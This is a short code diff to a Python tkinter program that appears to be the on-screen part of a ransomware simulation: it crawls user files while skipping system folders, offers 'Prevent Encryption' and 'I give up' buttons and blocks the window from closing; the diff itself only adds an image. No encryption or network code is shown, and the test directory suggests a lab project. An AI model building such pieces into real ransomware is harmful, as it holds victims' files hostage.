@@ -1,12 +1,13 @@
 import tkinter as tk
 from tkinter import filedialog
+import PIL
 from datetime import datetime as dt
 import math
 import Victim.crawler.crawler as crawler
 import pyaudio as pa
 import wave
 import threading
-
+from tkinter import PhotoImage
 dirs_to_skip = ["Program Files (x86)", "Program Files", "Windows", "Public", "Applications"]
 start_dir = "./run_test_dir"
 file_list = crawler.crawl_files(start_dir, dirs_to_skip)
@@ -15,6 +16,7 @@ for i in range(10):
 next_file_index = 10
 last_click = dt.now()
 loop = True
+img = None
 
 def counter_label(label):
     def count():
@@ -119,5 +121,8 @@ button = tk.Button(root, text='Prevent Encryption', width=25, command=click)
 button.pack()
 button = tk.Button(root, text='I give up', width=25, command=surrender)
 button.pack()
+img = PhotoImage(file="image1.gif")
+img_panel = tk.Label(root, image=img)
+img_panel.pack()
 root.protocol('WM_DELETE_WINDOW', fake_close)
 root.mainloop()
